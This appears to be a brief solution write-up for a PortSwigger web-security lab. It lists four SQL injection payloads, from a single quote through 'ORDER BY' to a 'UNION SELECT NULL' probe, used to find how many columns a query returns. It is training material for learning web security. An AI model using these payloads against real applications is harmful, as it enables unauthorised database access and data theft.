# SQL injection UNION attack, determining the number of columns returned by the query
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

Step - 1
---
```
'
```
Error > Single Quotes

Step - 2
---
```
'--
```
No MySQL

Step - 3
---
```
' ORDER BY 4--
```
Error > 3 Column

Step - 4
---
```
' UNION SELECT NULL,NULL,NULL--
```
